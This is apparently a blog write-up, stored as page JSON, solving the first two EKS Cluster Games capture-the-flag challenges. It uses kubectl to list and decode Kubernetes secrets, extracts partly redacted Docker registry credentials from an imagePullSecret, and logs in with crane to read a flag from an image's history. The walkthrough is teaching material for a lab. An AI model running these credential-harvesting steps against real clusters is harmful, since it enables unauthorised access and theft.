{"pageProps":{"postData":{"id":["2023","eks_cluster_games_ctf"],"path":"2023/eks_cluster_games_ctf","contentHtml":"<p><a href=\"https://eksclustergames.com\">eksclustergames.com</a> is a new CTF targetted at\nkubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>\n<h1>Challenge 1</h1>\n<p>The first challenge starts off with a clue:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">Jumpstart your quest by listing all the secrets in the cluster.</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">Can you spot the flag among them?</span></span></code></pre></div>\n<p>So lets start off by getting the secrets:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">NAME</span><span style=\"color: #ADBAC7\">         </span><span style=\"color: #96D0FF\">TYPE</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">DATA</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">AGE</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">log-rotate</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">Opaque</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #6CB6FF\">1</span><span style=\"color: #ADBAC7\">      </span><span style=\"color: #6CB6FF\">37</span><span style=\"color: #96D0FF\">h</span></span></code></pre></div>\n<p>Since there is only one, lets view it!</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"v1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"items\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"apiVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"v1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"data\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"flag\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ==\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"Secret\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"metadata\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"creationTimestamp\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:02:08Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"name\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"log-rotate\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"namespace\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"challenge1\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"resourceVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"890951\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">                </span><span style=\"color: #F69D50\">\"uid\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"03f6372c-b728-4c5b-ad28-70d5af8d387c\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">            </span><span style=\"color: #F69D50\">\"type\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"Opaque\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"kind\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"List\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"metadata\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">        </span><span style=\"color: #F69D50\">\"resourceVersion\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can\ndecode it as well:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.items[0].data.flag'</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-r</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F69D50\">base64</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-d</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">wiz_eks_challenge</span><span style=\"color: #ADBAC7\">{omg_over_privileged_*REDACTED*}</span></span></code></pre></div>\n<p>First flag found!</p>\n<p>This one was definitely a softball but it gets you nice and warmed up on the\nplatform.</p>\n<h1>Challenge 2</h1>\n<p>The hint for this challenge is:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"\" data-theme=\"default\"><code data-language=\"\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #adbac7\">A thing we learned during our research: always check the container registries.</span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\"></span></span>\n<span data-line=\"\"><span style=\"color: #adbac7\">For your convenience, the crane utility is already pre-installed on the machine.</span></span></code></pre></div>\n<p>The first thing I think of when reading this is that it has something to do\nwith the registry a pod is living on.   So lets list the pods and see what is\navailable:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">NAME</span><span style=\"color: #ADBAC7\">                    </span><span style=\"color: #96D0FF\">READY</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">STATUS</span><span style=\"color: #ADBAC7\">    </span><span style=\"color: #96D0FF\">RESTARTS</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #96D0FF\">AGE</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">database-pod-2c9b3a4e</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #6CB6FF\">1</span><span style=\"color: #96D0FF\">/1</span><span style=\"color: #ADBAC7\">     </span><span style=\"color: #96D0FF\">Running</span><span style=\"color: #ADBAC7\">   </span><span style=\"color: #6CB6FF\">0</span><span style=\"color: #ADBAC7\">          </span><span style=\"color: #6CB6FF\">36</span><span style=\"color: #96D0FF\">h</span></span></code></pre></div>\n<p>With only one pod as a target, lets get the image for it:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.items[0].spec.containers[0].image'</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">\"eksclustergames/base_ext_image\"</span></span></code></pre></div>\n<p>So its on standard <code>docker.io</code> registry instead of a private one like I was\nexpecting from the clue.   The second hint was that crane is on the system so\nlets use that to pull the image and inspect it:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eksclustergames/base_ext_image</span><span style=\"color: #ADBAC7\"> </span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">Error:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">fetching</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">reading</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">image</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"eksclustergames/base_ext_image\":</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">GET</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">UNAUTHORIZED:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">authentication</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">required</span><span style=\"color: #ADBAC7\">; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]</span></span></code></pre></div>\n<p>Which means this is a private image and we are going to need to get some\ncredentials to an account that has access to this image. Usually you have to\ndefine a secret for kubernetes to be able to pull from private registries and\nsince we started off with a secret test first that is where I'm going to go\nnext:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">pod</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.items[0].spec.imagePullSecrets'</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">[</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #96D0FF\">\"name\"</span><span style=\"color: #ADBAC7\">: </span><span style=\"color: #96D0FF\">\"registry-pull-secrets-780bab1d\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">]</span></span></code></pre></div>\n<p>So that is the secret we need, lets view it:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">kubectl</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">get</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">secret</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">registry-pull-secrets-780bab1d</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-o</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">json</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">'.data.\".dockerconfigjson\"'</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-r</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">base64</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-d</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"auths\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"index.docker.io/v1/\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"auth\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ZWtzY2x1c3RlcmdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZUWo4RnVDbw==\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">}</span></span></code></pre></div>\n<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">echo</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw==\"</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F47067\">|</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #F69D50\">base64</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-d</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">eksclustergames:dckr&#x3C;*REDACTED*></span></span></code></pre></div>\n<p>So now we can login with <code>crane auth</code>:</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">auth</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">login</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-u</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eksclustergames</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">-p</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">dckr</span><span style=\"color: #F47067\">&#x3C;</span><span style=\"color: #6CB6FF\">*</span><span style=\"color: #96D0FF\">REDACTED</span><span style=\"color: #F47067\">*></span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">docker.io</span></span>\n<span data-line=\"\"><span style=\"color: #F69D50\">2023/11/03</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">02</span><span style=\"color: #96D0FF\">:35:49</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">logged</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">in</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">via</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">/home/user/.docker/config.json</span></span></code></pre></div>\n<p>So if we try to view the image again it should work!</p>\n<div data-rehype-pretty-code-fragment=\"\"><pre class=\"github-dark-dimmed\" style=\"background-color: #22272e\" tabindex=\"0\" data-language=\"bash\" data-theme=\"default\"><code data-language=\"bash\" data-theme=\"default\" style=\"display: grid;\"><span data-line=\"\"><span style=\"color: #F69D50\">❯</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">crane</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">config</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">eksclustergames/base_ext_image</span><span style=\"color: #F47067\">|</span><span style=\"color: #F69D50\">jq</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"architecture\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"amd64\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"config\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Env\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"Cmd\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"/bin/sleep\"</span><span style=\"color: #F69D50\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"3133337\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"ArgsEscaped\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span><span style=\"color: #96D0FF\">,</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"OnBuild\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">null</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:18.920734382Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"history\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-07-18T23:19:33.538571854Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / \"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-07-18T23:19:33.655005962Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"/bin/sh -c #(nop)  CMD [</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">sh</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">]\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"empty_layer\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:18.920734382Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"comment\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"buildkit.dockerfile.v0\"</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    },</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    {</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"2023-11-01T13:32:18.920734382Z\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"created_by\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"CMD [</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">/bin/sleep</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\"> </span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">3133337</span><span style=\"color: #F47067\">\\\"</span><span style=\"color: #96D0FF\">]\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"comment\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"buildkit.dockerfile.v0\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"empty_layer\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #6CB6FF\">true</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    }</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  ],</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"os\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"linux\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">  </span><span style=\"color: #F69D50\">\"rootfs\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">{</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"type\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> </span><span style=\"color: #96D0FF\">\"layers\",</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">    </span><span style=\"color: #F69D50\">\"diff_ids\"</span><span style=\"color: #6CB6FF\">:</span><span style=\"color: #ADBAC7\"> [</span></span>\n<span data-line=\"\"><span style=\"color: #ADBAC7\">      </span><span style=\"color: #F69D50\">\"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f\"</span><span 